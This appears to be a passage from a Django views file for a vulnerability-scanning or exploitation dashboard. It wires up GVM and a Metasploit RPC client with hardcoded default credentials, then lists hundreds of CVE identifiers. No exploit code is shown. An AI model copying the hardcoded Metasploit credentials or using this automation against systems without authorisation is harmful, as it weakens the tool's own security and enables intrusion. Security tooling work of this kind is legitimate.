from nltk.corpus import stopwords
import GVM.GVM.gvm as gvm
import json
import random
import re
import subprocess
from django.shortcuts import render
from django.views import View
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404, redirect
from django.template import loader
from django.http import HttpResponse, JsonResponse, HttpResponseRedirect
from django import template
from pymetasploit3.msfrpc import MsfRpcClient
import xml.etree.ElementTree as ET
import time
import threading
import re
from collections import Counter
from Users.models import User
from .models import Exploit
from collections import Counter
from nltk.tokenize import word_tokenize
import nltk
from nltk.corpus import stopwords
import re

# stop_words = set(stopwords.words('english'))
msf_user = 'msf'
msf_pass = 'msf'
msf_host = '127.0.0.1'
msf_port = 55552
# Khởi tạo đối tượng MsfRpcClient
client = MsfRpcClient(msf_pass, port=msf_port,
                      username=msf_user, server=msf_host)

host_name = "192.168.1.17:8888"
# Create your views here.
cve_lists=["CVE-2023-29210","CVE-2023-29209","CVE-2023-29208","CVE-2023-29207","CVE-2023-29206","CVE-2023-29205","CVE-2023-29204","CVE-2023-29203","CVE-2023-29202","CVE-2023-29201","CVE-2023-2107","CVE-2023-2106","CVE-2023-2105","CVE-2023-2104","CVE-2023-2103","CVE-2023-2102","CVE-2023-2101","CVE-2023-2100","CVE-2022-2525","CVE-2023-2099","CVE-2023-2098","CVE-2023-2097","CVE-2023-2096","CVE-2023-2095","CVE-2023-2094","CVE-2023-2093","CVE-2023-2092","CVE-2023-2091","CVE-2023-2090","CVE-2023-2089","CVE-2023-2027","CVE-2022-47522","CVE-2022-45030","CVE-2022-43699","CVE-2022-43698","CVE-2022-43697","CVE-2022-43696","CVE-2023-24607","CVE-2023-22670","CVE-2023-22669","CVE-2022-48178","CVE-2022-48177","CVE-2023-27572","CVE-2023-27571","CVE-2023-26463","CVE-2021-46880","CVE-2023-29383","CVE-2023-24934","CVE-2023-2008","CVE-2023-2004","CVE-2023-29091","CVE-2023-29090","CVE-2023-29089","CVE-2023-29088","CVE-2023-29087","CVE-2023-29086","CVE-2023-29085","CVE-2023-25597","CVE-2023-30535","CVE-2023-2077","CVE-2023-2076","CVE-2023-2075","CVE-2023-2074","CVE-2023-29193","CVE-2023-27654","CVE-2023-27647","CVE-2022-46886","CVE-2023-2073","CVE-2023-2033","CVE-2023-29529","CVE-2023-29199","CVE-2023-29194","CVE-2023-29067","CVE-2023-29018","CVE-2023-29013","CVE-2023-27915","CVE-2023-27914","CVE-2023-27913","CVE-2023-27912","CVE-2022-47501","CVE-2023-30459","CVE-2023-2059","CVE-2023-28091","CVE-2023-28085","CVE-2022-4893","CVE-2022-3748","CVE-2023-2058","CVE-2023-2057","CVE-2023-2056","CVE-2023-29850","CVE-2023-29847","CVE-2023-29805","CVE-2023-29804","CVE-2023-29803","CVE-2023-29802","CVE-2023-29801","CVE-2023-29800","CVE-2023-29799","CVE-2023-29798","CVE-2023-22949","CVE-2023-1833","CVE-2023-1803","CVE-2022-45180","CVE-2022-45178","CVE-2022-45175","CVE-2022-45174","CVE-2022-45173","CVE-2022-45170","CVE-2023-2055","CVE-2023-2054","CVE-2023-2053","CVE-2023-26980","CVE-2023-26559","CVE-2023-2052","CVE-2023-2051","CVE-2023-2050","CVE-2023-29584","CVE-2023-29569","CVE-2023-27666","CVE-2023-27653","CVE-2023-27651","CVE-2023-27649","CVE-2023-27648","CVE-2023-27643","CVE-2023-27193","CVE-2023-26756","CVE-2023-1617","CVE-2022-47027","CVE-2023-2049","CVE-2023-2048","CVE-2023-2047","CVE-2023-2044","CVE-2023-2043","CVE-2023-2042","CVE-2023-2041","CVE-2023-2040","CVE-2023-1863","CVE-2023-2039","CVE-2023-2038","CVE-2023-2037","CVE-2023-2036","CVE-2023-2035","CVE-2023-26123","CVE-2023-1285","CVE-2023-29627","CVE-2023-29626","CVE-2023-29625","CVE-2023-29623","CVE-2023-29622","CVE-2023-29621","CVE-2023-26969","CVE-2023-2034","CVE-2023-29491","CVE-2023-29132","CVE-2023-27890","CVE-2023-30638","CVE-2023-26918","CVE-2023-30637","CVE-2023-30636","CVE-2023-30635","CVE-2023-1326","CVE-2022-48468","CVE-2023-29573","CVE-2023-27748","CVE-2023-27747","CVE-2023-27746","CVE-2023-27667","CVE-2023-26416","CVE-2023-26415","CVE-2023-26414","CVE-2023-26413","CVE-2023-26412","CVE-2023-26411","CVE-2023-26410","CVE-2023-26409","CVE-2023-26398","CVE-2023-24509","CVE-2023-22951","CVE-2023-20866","CVE-2023-20863","CVE-2023-1271","CVE-2023-29084","CVE-2023-26264","CVE-2023-26263","CVE-2023-22948","CVE-2022-2445","CVE-2023-27772","CVE-2023-22950","CVE-2023-27779","CVE-2023-30630","CVE-2023-29598","CVE-2023-29597","CVE-2023-27812","CVE-2023-2021","CVE-2022-45358","CVE-2022-44625","CVE-2022-45064","CVE-2023-21630","CVE-2023-20118","CVE-2023-1842","CVE-2022-40532","CVE-2022-40503","CVE-2022-33302","CVE-2022-33301","CVE-2022-33298","CVE-2022-33297","CVE-2022-33296","CVE-2022-33295","CVE-2022-33294","CVE-2022-33291","CVE-2022-33289","CVE-2022-33288","CVE-2022-33287","CVE-2022-33282","CVE-2022-33270","CVE-2022-33269","CVE-2022-33259","CVE-2022-33258","CVE-2022-33231","CVE-2022-33228","CVE-2022-33223","CVE-2022-33222","CVE-2022-33211","CVE-2022-25747","CVE-2022-25745","CVE-2022-25740","CVE-2022-25739","CVE-2022-25737","CVE-2022-25731","CVE-2022-25730","CVE-2022-25726","CVE-2022-25678","CVE-2023-25954","CVE-2023-2014","CVE-2023-22897","CVE-2023-22620","CVE-2023-26403","CVE-2023-26402","CVE-2023-26394","CVE-2023-26393","CVE-2023-26392","CVE-2023-26391","CVE-2023-26390","CVE-2023-26389","CVE-2023-26388","CVE-2023-26387","CVE-2023-26386","CVE-2023-26385","CVE-2023-26384","CVE-2023-26383","CVE-2023-22235","CVE-2023-21582","CVE-2023-1994","CVE-2023-1906","CVE-2023-28121","CVE-2023-26425","CVE-2023-26424","CVE-2023-26423","CVE-2023-26422","CVE-2023-26421","CVE-2023-26420","CVE-2023-26419","CVE-2023-26418","CVE-2023-26417","CVE-2023-26408","CVE-2023-26407","CVE-2023-26406","CVE-2023-26405","CVE-2023-26397","CVE-2023-26396","CVE-2023-26395","CVE-2023-24545","CVE-2023-24511","CVE-2023-1993","CVE-2023-1992","CVE-2023-1706","CVE-2022-4463","CVE-2022-3404","CVE-2023-26404","CVE-2023-26401","CVE-2023-26400","CVE-2023-26382","CVE-2023-26381","CVE-2023-26380","CVE-2023-26379","CVE-2023-26378","CVE-2023-26377","CVE-2023-26376","CVE-2023-26375","CVE-2023-26374","CVE-2023-26373","CVE-2023-26372","CVE-2023-26371","CVE-2023-24513","CVE-2023-1990","CVE-2023-30532","CVE-2023-30531","CVE-2023-30530","CVE-2023-30529","CVE-2023-30528","CVE-2023-30527","CVE-2023-30526","CVE-2023-30525","CVE-2023-30524","CVE-2023-30523","CVE-2023-30522","CVE-2023-30521","CVE-2023-30520","CVE-2023-30519","CVE-2023-30518","CVE-2023-30517","CVE-2023-30516","CVE-2023-30515","CVE-2023-30514","CVE-2023-30513","CVE-2023-27216","CVE-2023-26852","CVE-2023-0006","CVE-2023-0005","CVE-2023-0004","CVE-2023-29581","CVE-2023-28488","CVE-2023-27703","CVE-2023-1872","CVE-2023-29571","CVE-2023-27830","CVE-2022-47605","CVE-2023-27775","CVE-2023-27704","CVE-2023-27032","CVE-2023-23591","CVE-2023-1874","CVE-2023-29580","CVE-2023-29574","CVE-2023-27826","CVE-2023-22616","CVE-2022-47053","CVE-2022-24350","CVE-2023-1829","CVE-2023-30512","CVE-2022-48437","CVE-2023-22613","CVE-2023-29576","CVE-2023-28808","CVE-2023-28314","CVE-2023-28313","CVE-2023-28312","CVE-2023-28311","CVE-2023-28309","CVE-2023-28308","CVE-2023-28307","CVE-2023-28306","CVE-2023-28305","CVE-2023-28304","CVE-2023-28302","CVE-2023-28301","CVE-2023-28300","CVE-2023-28299","CVE-2023-28298","CVE-2023-28297","CVE-2023-28296","CVE-2023-28293","CVE-2023-28292","CVE-2023-28291","CVE-2023-28288","CVE-2023-28285","CVE-2023-28284","CVE-2023-28278","CVE-2023-28277","CVE-2023-28276","CVE-2023-28275","CVE-2023-28274","CVE-2023-28273","CVE-2023-28272","CVE-2023-28271","CVE-2023-28270","CVE-2023-28269","CVE-2023-28268","CVE-2023-28267","CVE-2023-28266","CVE-2023-28263","CVE-2023-28262","CVE-2023-28260","CVE-2023-28256","CVE-2023-28255","CVE-2023-28254","CVE-2023-28253","CVE-2023-28252","CVE-2023-28250","CVE-2023-28249","CVE-2023-28248","CVE-2023-28247","CVE-2023-28246","CVE-2023-28244","CVE-2023-28243","CVE-2023-28241","CVE-2023-28240","CVE-2023-28238","CVE-2023-28237","CVE-2023-28236","CVE-2023-28235","CVE-2023-28234","CVE-2023-28233","CVE-2023-28232","CVE-2023-28231","CVE-2023-28229","CVE-2023-28228","CVE-2023-28227","CVE-2023-28226","CVE-2023-28225","CVE-2023-28224","CVE-2023-28223","CVE-2023-28222","CVE-2023-28221","CVE-2023-28220","CVE-2023-28219","CVE-2023-28218","CVE-2023-28217","CVE-2023-28216","CVE-2023-26555","CVE-2023-26554","CVE-2023-26553","CVE-2023-26552","CVE-2023-26551","CVE-2023-26260","CVE-2023-25415","CVE-2023-25414","CVE-2023-25413","CVE-2023-25411","CVE-2023-25409","CVE-2023-25407","CVE-2023-24935","CVE-2023-24931","CVE-2023-24929","CVE-2023-24928","CVE-2023-24927","CVE-2023-24926","CVE-2023-24925","CVE-2023-24924","CVE-2023-24914","CVE-2023-24912","CVE-2023-24893","CVE-2023-24887","CVE-2023-24886","CVE-2023-24885","CVE-2023-24884","CVE-2023-24883","CVE-2023-24860","CVE-2023-23384","CVE-2023-23375","CVE-2023-22808","CVE-2023-22615","CVE-2023-22614","CVE-2023-22612","CVE-2023-21769","CVE-2023-21729","CVE-2023-21727","CVE-2023-21554","CVE-2023-1989","CVE-2022-46396","CVE-2020-9009","CVE-2023-1988","CVE-2023-1987","CVE-2023-1986","CVE-2023-1985","CVE-2023-1984","CVE-2023-1980","CVE-2023-1939","CVE-2021-46879","CVE-2021-46878","CVE-2020-24736","CVE-2020-19803","CVE-2020-19802","CVE-2023-27995","CVE-2023-22642","CVE-2023-22641","CVE-2023-22635","CVE-2023-1983","CVE-2022-43955","CVE-2022-43952","CVE-2022-43951","CVE-2022-43948","CVE-2022-43947","CVE-2022-43946","CVE-2022-42477","CVE-2022-42470","CVE-2022-42469","CVE-2022-41331","CVE-2022-41330","CVE-2022-40682","CVE-2022-40679","CVE-2022-35850","CVE-2022-27487","CVE-2022-27485","CVE-2022-43770","CVE-2022-3695","CVE-2023-30465","CVE-2023-27192","CVE-2023-26847","CVE-2023-26846","CVE-2023-26845","CVE-2023-23277","CVE-2023-1552","CVE-2023-28062","CVE-2023-26964","CVE-2023-0645","CVE-2023-27645","CVE-2023-27179","CVE-2023-26917","CVE-2022-47468","CVE-2022-47467","CVE-2022-47466","CVE-2022-47465","CVE-2022-47464","CVE-2022-47463","CVE-2022-47362","CVE-2022-47338","CVE-2022-47337","CVE-2022-47336","CVE-2022-47335","CVE-2023-1976","CVE-2023-29054","CVE-2023-29053","CVE-2023-28828","CVE-2023-28766","CVE-2023-28489","CVE-2023-27464","CVE-2023-26293","CVE-2023-23588","CVE-2023-1975","CVE-2023-1974","CVE-2022-43768","CVE-2022-43767","CVE-2022-43716","CVE-2023-28368","CVE-2023-27917","CVE-2023-27520","CVE-2023-27389","CVE-2023-26593","CVE-2023-26588","CVE-2023-25955","CVE-2023-25950","CVE-2023-25755","CVE-2023-24544","CVE-2023-24464","CVE-2023-23575","CVE-2023-23572","CVE-2023-22429","CVE-2023-22282","CVE-2023-29492","CVE-2023-26122","CVE-2023-26121","CVE-2023-29189","CVE-2023-29187","CVE-2023-29186","CVE-2023-29185","CVE-2023-29112","CVE-2023-29111","CVE-2023-29110","CVE-2023-29109","CVE-2023-29108","CVE-2023-28765","CVE-2023-28763","CVE-2023-28761","CVE-2023-27897","CVE-2023-27499","CVE-2023-27497","CVE-2023-27267","CVE-2023-26458","CVE-2023-24527","CVE-2023-1903","CVE-2023-28341","CVE-2023-28340","CVE-2023-27191","CVE-2023-24182","CVE-2022-43293","CVE-2022-38604","CVE-2023-29192","CVE-2023-26467","CVE-2023-24721","CVE-2023-1916","CVE-2023-1668","CVE-2023-29005","CVE-2023-28093","CVE-2023-27178","CVE-2023-27076","CVE-2023-26773","CVE-2023-26466","CVE-2023-26495","CVE-2023-26070","CVE-2023-26069","CVE-2023-26068","CVE-2023-26067","CVE-2023-26066","CVE-2023-26065","CVE-2023-26064","CVE-2023-26063","CVE-2023-28206","CVE-2023-28205","CVE-2022-46717","CVE-2022-46716","CVE-2022-46709","CVE-2022-46703","CVE-2022-42858","CVE-2022-32871","CVE-2018-25084","CVE-2015-10100","CVE-2023-27650","CVE-2023-1971","CVE-2023-26986","CVE-2023-26919","CVE-2023-1970","CVE-2023-1969","CVE-2023-29376","CVE-2023-29375","CVE-2023-1381","CVE-2022-41976","CVE-2023-25392","CVE-2023-24181","CVE-2023-1478","CVE-2023-1426","CVE-2023-1425","CVE-2023-1406","CVE-2023-1122","CVE-2023-1121","CVE-2023-1120","CVE-2023-0983","CVE-2023-0893","CVE-2023-0874","CVE-2023-0605","CVE-2023-0546","CVE-2023-0423","CVE-2023-0422","CVE-2023-0363","CVE-2023-0157","CVE-2023-0156","CVE-2022-4827","CVE-2022-39048","CVE-2023-26860","CVE-2023-26788","CVE-2022-37462","CVE-2020-36077","CVE-2023-26774","CVE-2015-10099","CVE-2021-45985","CVE-2023-29216","CVE-2023-29215","CVE-2023-27987","CVE-2023-27603","CVE-2023-27602","CVE-2023-26120","CVE-2014-125098","CVE-2014-125097","CVE-2014-125096","CVE-2023-30456","CVE-2012-10012","CVE-2009-10004","CVE-2012-10011","CVE-2023-27720","CVE-2023-27719","CVE-2023-27718","CVE-2023-27730","CVE-2023-27729","CVE-2023-27728","CVE-2023-27727","CVE-2023-1964","CVE-2023-1963","CVE-2023-1962","CVE-2014-125095","CVE-2012-10010","CVE-2023-30450","CVE-2013-10025","CVE-2013-10024","CVE-2023-1961","CVE-2023-1960","CVE-2023-1959","CVE-2023-1958","CVE-2023-1957","CVE-2023-1956","CVE-2023-1955","CVE-2023-1954","CVE-2023-1953","CVE-2023-1952","CVE-2015-10098","CVE-2013-10023","CVE-2023-1951","CVE-2023-1950","CVE-2023-1949","CVE-2023-1948","CVE-2023-24626","CVE-2023-1947","CVE-2023-1946","CVE-2023-27180","CVE-2023-27033","CVE-2023-1801","CVE-2022-43309","CVE-2023-23762","CVE-2023-23761","CVE-2023-1942","CVE-2023-1941","CVE-2023-1940","CVE-2023-1909","CVE-2023-29388","CVE-2023-29172","CVE-2023-29171","CVE-2023-29170","CVE-2023-28792","CVE-2023-28789","CVE-2023-28781","CVE-2023-28710","CVE-2023-28707","CVE-2023-28706","CVE-2023-27876","CVE-2023-27810","CVE-2023-27808","CVE-2023-27807","CVE-2023-27806","CVE-2023-27805","CVE-2023-27804","CVE-2023-27803","CVE-2023-27802","CVE-2023-27801","CVE-2023-27620","CVE-2023-25442","CVE-2023-23799","CVE-2022-43928","CVE-2022-43914","CVE-2022-33959","CVE-2023-29094","CVE-2023-25713","CVE-2023-25712","CVE-2023-25711","CVE-2023-25705","CVE-2023-25702","CVE-2023-25464","CVE-2023-1726","CVE-2022-34333","CVE-2023-29236","CVE-2023-28993","CVE-2023-25716","CVE-2023-25049","CVE-2023-25041","CVE-2023-25031","CVE-2023-25020","CVE-2023-23994","CVE-2023-23885","CVE-2023-25027","CVE-2023-25024","CVE-2023-25023","CVE-2023-25022","CVE-2023-25046","CVE-2023-24398","CVE-2023-25061","CVE-2023-25059","CVE-2023-24402","CVE-2023-1937","CVE-2023-28051","CVE-2023-29478","CVE-2023-26978","CVE-2023-26848","CVE-2023-26820","CVE-2023-26817","CVE-2023-27021","CVE-2023-27020","CVE-2023-27019","CVE-2023-27018","CVE-2023-27017","CVE-2023-27016","CVE-2023-27015","CVE-2023-27014","CVE-2023-27013","CVE-2023-27012","CVE-2023-25220","CVE-2023-25219","CVE-2023-25218","CVE-2023-25217","CVE-2023-25216","CVE-2023-25215","CVE-2023-25214","CVE-2023-25213","CVE-2023-25212","CVE-2023-25211","CVE-2023-25210","CVE-2023-24800","CVE-2023-24799","CVE-2023-24798","CVE-2023-24797","CVE-2020-11935","CVE-2023-29475","CVE-2023-29474","CVE-2023-29473","CVE-2023-28500","CVE-2023-1931","CVE-2023-1930","CVE-2023-1929","CVE-2023-1928","CVE-2023-1927","CVE-2014-125094","CVE-2023-29465","CVE-2023-29017","CVE-2023-29016","CVE-2023-29015","CVE-2023-29014","CVE-2023-1926","CVE-2023-1925","CVE-2023-1924","CVE-2023-1923","CVE-2023-1922","CVE-2023-1921","CVE-2023-1920","CVE-2023-1919","CVE-2023-1918","CVE-2023-20688","CVE-2023-20687","CVE-2023-20686","CVE-2023-20685","CVE-2023-20684","CVE-2023-20682","CVE-2023-20681","CVE-2023-20680","CVE-2023-20679","CVE-2023-20677","CVE-2023-20676","CVE-2023-20675","CVE-2023-20674","CVE-2023-20670","CVE-2023-20666","CVE-2023-20665","CVE-2023-20664","CVE-2023-20663","CVE-2023-20662","CVE-2023-20661","CVE-2023-20660","CVE-2023-20659","CVE-2023-20658","CVE-2023-20657","CVE-2023-20656","CVE-2023-20655","CVE-2023-20654","CVE-2023-20653","CVE-2023-20652","CVE-2022-32599","CVE-2023-29010","CVE-2023-29008","CVE-2023-0580","CVE-2023-26083","CVE-2023-24537","CVE-2023-22985","CVE-2023-1913","CVE-2023-1912","CVE-2020-36074","CVE-2020-36073","CVE-2020-36072","CVE-2020-36071","CVE-2023-25062","CVE-2023-24396","CVE-2023-24378","CVE-2023-24374","CVE-2023-23891","CVE-2023-23801","CVE-2023-1908","CVE-2022-46793","CVE-2023-24411","CVE-2023-24403","CVE-2023-24387","CVE-2023-24383","CVE-2023-23898","CVE-2023-24004","CVE-2023-24003","CVE-2023-24002","CVE-2023-24006","CVE-2023-24001","CVE-2023-23998","CVE-2023-23996","CVE-2023-23980","CVE-2023-28046","CVE-2023-23987","CVE-2023-23979","CVE-2023-23972","CVE-2023-23971","CVE-2023-29421","CVE-2023-29420","CVE-2023-29419","CVE-2023-29418","CVE-2023-29417","CVE-2023-29416","CVE-2023-29415","CVE-2023-23982","CVE-2023-23981","CVE-2023-23815","CVE-2022-31890","CVE-2022-31889","CVE-2023-1787","CVE-2023-1710","CVE-2023-1708","CVE-2023-1417","CVE-2023-1167","CVE-2023-1071","CVE-2023-0838","CVE-2023-0450","CVE-2023-24747","CVE-2023-24720","CVE-2023-1855","CVE-2023-1782","CVE-2023-1733","CVE-2023-1582","CVE-2023-1098","CVE-2023-0842","CVE-2023-0523","CVE-2023-0319","CVE-2022-3513","CVE-2022-3375","CVE-2023-28342","CVE-2023-20153","CVE-2023-20151","CVE-2023-20150","CVE-2023-20149","CVE-2023-20148","CVE-2023-20147","CVE-2023-20146","CVE-2023-20145","CVE-2023-20144","CVE-2023-20143","CVE-2023-20142","CVE-2023-20141","CVE-2023-20140","CVE-2023-20139","CVE-2023-20138","CVE-2023-20137","CVE-2023-20123","CVE-2023-20122","CVE-2023-20121","CVE-2023-20117","CVE-2023-20103","CVE-2023-20102","CVE-2023-20096","CVE-2023-1838","CVE-2023-0670","CVE-2022-4941","CVE-2022-4940","CVE-2022-4939","CVE-2023-29006","CVE-2023-28855","CVE-2023-28852","CVE-2023-28849","CVE-2023-28838","CVE-2023-28639","CVE-2023-28636","CVE-2023-20152","CVE-2023-20134","CVE-2023-20132","CVE-2023-20131","CVE-2023-20130","CVE-2023-20129","CVE-2023-20128","CVE-2023-20127","CVE-2023-20124","CVE-2022-4938","CVE-2022-4937","CVE-2022-4936","CVE-2022-4935","CVE-2023-28634","CVE-2023-20051","CVE-2023-1887","CVE-2023-1886","CVE-2023-1885","CVE-2023-1884","CVE-2023-1883","CVE-2023-1882","CVE-2023-1881","CVE-2023-1880","CVE-2023-1879","CVE-2023-1878","CVE-2023-1877","CVE-2023-1876","CVE-2023-29389","CVE-2023-28633","CVE-2023-20073","CVE-2023-20068","CVE-2023-20030","CVE-2023-20023","CVE-2023-20022","CVE-2023-1788","CVE-2023-1758","CVE-2023-1757","CVE-2023-1756","CVE-2023-1412","CVE-2023-28632","CVE-2023-20021","CVE-2023-26857","CVE-2023-26856","CVE-2023-25330","CVE-2023-1871","CVE-2023-1870","CVE-2023-1869","CVE-2023-1868","CVE-2023-1867","CVE-2023-1866","CVE-2023-1865","CVE-2023-26789","CVE-2013-10022","CVE-2023-1860","CVE-2023-1858","CVE-2023-28069","CVE-2023-26536","CVE-2023-1857","CVE-2023-1856","CVE-2023-1854","CVE-2023-1853","CVE-2023-1852","CVE-2023-1851","CVE-2023-1850","CVE-2023-1849","CVE-2023-1848","CVE-2023-1847","CVE-2023-1846","CVE-2023-1845","CVE-2023-0382","CVE-2023-29323","CVE-2023-0835","CVE-2023-0486","CVE-2023-0480","CVE-2023-0357","CVE-2023-29003","CVE-2023-28853","CVE-2023-28842","CVE-2023-28841","CVE-2023-28840","CVE-2023-1823","CVE-2023-1822","CVE-2023-1821","CVE-2023-1820","CVE-2023-1819","CVE-2023-1818","CVE-2023-1817","CVE-2023-1816","CVE-2023-1815","CVE-2023-1814","CVE-2023-1813","CVE-2023-1812","CVE-2023-1811","CVE-2023-1810","CVE-2023-0325","CVE-2023-0265","CVE-2023-27496","CVE-2023-27493","CVE-2023-1840","CVE-2023-27492","CVE-2023-27491","CVE-2023-27488","CVE-2023-27091","CVE-2023-27089","CVE-2023-1752","CVE-2023-1751","CVE-2023-1750","CVE-2023-1749","CVE-2023-1748","CVE-2023-28613","CVE-2023-27487","CVE-2023-26974","CVE-2022-48227","CVE-2022-48224","CVE-2022-48223","CVE-2022-48222","CVE-2023-27771","CVE-2023-27770","CVE-2023-27769","CVE-2023-27768","CVE-2023-27767","CVE-2023-27766","CVE-2023-27765","CVE-2023-27764","CVE-2023-27763","CVE-2023-27762","CVE-2023-27761","CVE-2023-27760","CVE-2023-27759","CVE-2023-27734","CVE-2023-26991","CVE-2023-26921","CVE-2023-26777","CVE-2023-26776","CVE-2023-26775","CVE-2023-26750","CVE-2023-26733","CVE-2023-26437","CVE-2022-48228","CVE-2022-48226","CVE-2022-48225","CVE-2022-48221","CVE-2021-3267","CVE-2021-31707","CVE-2021-28235","CVE-2020-29312","CVE-2020-23327","CVE-2020-23260","CVE-2020-23259","CVE-2020-23258","CVE-2020-23257","CVE-2020-22533","CVE-2020-21514","CVE-2020-21487","CVE-2020-19695","CVE-2020-19693","CVE-2020-19692","CVE-2020-19279","CVE-2020-19278","CVE-2020-19277","CVE-2022-48435","CVE-2023-29000","CVE-2023-28999","CVE-2023-28998","CVE-2023-28997","CVE-2023-28848","CVE-2023-26866","CVE-2023-25356","CVE-2023-25355","CVE-2023-25305","CVE-2023-25303","CVE-2023-23977","CVE-2023-23870","CVE-2022-47870","CVE-2023-23878","CVE-2023-23821","CVE-2023-23686","CVE-2023-23685","CVE-2022-41633","CVE-2023-25942","CVE-2023-25941","CVE-2023-25940","CVE-2023-1827","CVE-2023-1671","CVE-2022-4934","CVE-2020-36692","CVE-2023-1826","CVE-2023-1728","CVE-2023-1768","CVE-2023-26976","CVE-2023-26855","CVE-2023-1579","CVE-2023-0922","CVE-2023-0614","CVE-2023-0225","CVE-2023-26916","CVE-2023-24724","CVE-2023-1611","CVE-2023-29218","CVE-2022-4771","CVE-2022-4770","CVE-2022-4769","CVE-2022-43941","CVE-2022-43940","CVE-2022-43939","CVE-2022-43938","CVE-2022-43772","CVE-2022-43771","CVE-2022-3960","CVE-2023-28854","CVE-2023-28851","CVE-2023-28850","CVE-2022-43773","CVE-2022-43769","CVE-2023-28837","CVE-2023-28836","CVE-2023-28834","CVE-2023-0977","CVE-2023-0975","CVE-2022-38072","CVE-2022-36440","CVE-2023-1377","CVE-2023-1330","CVE-2023-1124","CVE-2023-0820","CVE-2023-0399","CVE-2022-38923","CVE-2022-38922","CVE-2023-28625","CVE-2023-1766","CVE-2023-1765","CVE-2022-27665","CVE-2023-26529","CVE-2023-26269","CVE-2023-26119","CVE-2023-26112","CVE-2023-28684","CVE-2023-28683","CVE-2023-28682","CVE-2023-28681","CVE-2023-28680","CVE-2023-28679","CVE-2023-28678","CVE-2023-28677","CVE-2023-28676","CVE-2023-28675","CVE-2023-28674","CVE-2023-28673","CVE-2023-28672","CVE-2023-28671","CVE-2023-28670","CVE-2023-28669","CVE-2023-28668","CVE-2023-27286","CVE-2023-27284","CVE-2023-26283","CVE-2023-20559","CVE-2023-20558","CVE-2023-1603","CVE-2023-1580","CVE-2023-1574","CVE-2023-1202","CVE-2022-42452","CVE-2022-42447","CVE-2023-1800","CVE-2023-1799","CVE-2023-1798","CVE-2023-1797","CVE-2023-1796","CVE-2023-26822","CVE-2023-0198","CVE-2023-0197","CVE-2023-0195","CVE-2023-0194","CVE-2023-0192","CVE-2023-0191","CVE-2023-0189","CVE-2023-0188","CVE-2023-0187","CVE-2023-0186","CVE-2023-0185","CVE-2023-0183","CVE-2023-0182","CVE-2023-0181","CVE-2023-0180","CVE-2023-0208","CVE-2023-28645","CVE-2023-26485","CVE-2023-24824","CVE-2023-29141","CVE-2023-29140","CVE-2023-29139","CVE-2023-29137","CVE-2023-27160","CVE-2023-27159","CVE-2023-23594","CVE-2023-28843","CVE-2023-28879","CVE-2023-28877","CVE-2023-28862","CVE-2022-3192","CVE-2023-26830","CVE-2023-26829","CVE-2023-0344","CVE-2023-0343","CVE-2023-28756","CVE-2023-28755","CVE-2023-1747","CVE-2023-1746","CVE-2023-1745","CVE-2023-1744","CVE-2023-1670","CVE-2023-1742","CVE-2023-1741","CVE-2023-1393","CVE-2023-28846","CVE-2023-28462","CVE-2023-27538","CVE-2023-27537","CVE-2023-27536","CVE-2023-27535","CVE-2023-27534","CVE-2023-27533","CVE-2023-26692","CVE-2023-28835","CVE-2023-28833","CVE-2023-28647","CVE-2022-23522","CVE-2023-29059","CVE-2022-30351","CVE-2022-30350","CVE-2023-28935","CVE-2023-28503","CVE-2023-28502","CVE-2023-1652","CVE-2023-0836","CVE-2022-1274","CVE-2023-0664","CVE-2022-43648","CVE-2022-43647","CVE-2022-43646","CVE-2022-43645","CVE-2022-43644","CVE-2022-43643","CVE-2022-43642","CVE-2022-43638","CVE-2022-43636","CVE-2022-43635","CVE-2022-43634","CVE-2022-43618","CVE-2022-43617","CVE-2022-43616","CVE-2022-43615","CVE-2022-43614","CVE-2022-43613","CVE-2022-43612","CVE-2022-43611","CVE-2022-43610","CVE-2022-43609","CVE-2022-43608","CVE-2022-42432","CVE-2022-42431","CVE-2022-42430","CVE-2022-42428","CVE-2022-3210","CVE-2022-37378","CVE-2022-37376","CVE-2022-2848","CVE-2022-2825","CVE-2022-48434","CVE-2023-1685","CVE-2022-45460","CVE-2023-28447","CVE-2023-28427","CVE-2022-24908","CVE-2022-24907","CVE-2023-27247","CVE-2023-0466","CVE-2023-0465","CVE-2022-47529","CVE-2023-0179","CVE-2023-28885","CVE-2023-24787","CVE-2023-28336","CVE-2023-24788","CVE-2023-1544","CVE-2023-24367","CVE-2023-27100","CVE-2023-1281","CVE-2023-24709","CVE-2023-1534","CVE-2023-1533","CVE-2023-1532","CVE-2023-1531","CVE-2023-1530","CVE-2023-1529","CVE-2023-1528","CVE-2023-28425","CVE-2022-48425","CVE-2023-28531","CVE-2023-28155","CVE-2023-26262","CVE-2023-28343","CVE-2023-23423","CVE-2023-23422","CVE-2023-23421","CVE-2023-23420","CVE-2023-23399","CVE-2023-27896","CVE-2023-27895","CVE-2023-27894","CVE-2023-27893","CVE-2023-27501","CVE-2023-27500","CVE-2023-27498","CVE-2023-27271","CVE-2023-27270","CVE-2023-27269","CVE-2023-27268","CVE-2023-26461","CVE-2023-26460","CVE-2023-26459","CVE-2023-26457","CVE-2023-25618","CVE-2023-25617","CVE-2023-25616","CVE-2023-25615","CVE-2023-24526","CVE-2023-23857","CVE-2023-0030","CVE-2023-1220","CVE-2023-1219","CVE-2022-41333","CVE-2023-27290","CVE-2023-1118","CVE-2023-26053","CVE-2023-22462","CVE-2023-0507","CVE-2023-27320","CVE-2022-41723","CVE-2023-26325","CVE-2022-29273","CVE-2023-24812","CVE-2023-26253","CVE-2022-48340","CVE-2022-47986","CVE-2022-26032","CVE-2023-23926","CVE-2023-22855","CVE-2023-23381","CVE-2023-21815","CVE-2023-21778","CVE-2023-23379","CVE-2023-21807","CVE-2023-21722","CVE-2023-25614","CVE-2023-24530","CVE-2023-24529","CVE-2023-24528","CVE-2023-24525","CVE-2023-24524","CVE-2023-24523","CVE-2023-24522","CVE-2023-24521","CVE-2023-23860","CVE-2023-23859","CVE-2023-23855","CVE-2023-23854","CVE-2023-23853","CVE-2023-23852","CVE-2023-23851","CVE-2023-0025","CVE-2023-0024","CVE-2023-24827","CVE-2023-0669","CVE-2022-48010","CVE-2022-41703","CVE-2022-3977","CVE-2023-0039","CVE-2022-43603","CVE-2022-43602","CVE-2022-43601","CVE-2022-43600","CVE-2022-43599","CVE-2022-43598","CVE-2022-43597","CVE-2022-43596","CVE-2022-43595","CVE-2022-43594","CVE-2022-43593","CVE-2022-43592","CVE-2022-41999","CVE-2022-41988","CVE-2022-41981","CVE-2022-41977","CVE-2022-41838","CVE-2022-41837","CVE-2022-41794","CVE-2022-41684","CVE-2022-41649","CVE-2022-41639","CVE-2022-36354","CVE-2022-47521","CVE-2022-26582","CVE-2022-44699","CVE-2022-44687","CVE-2022-46265","CVE-2022-46144","CVE-2022-4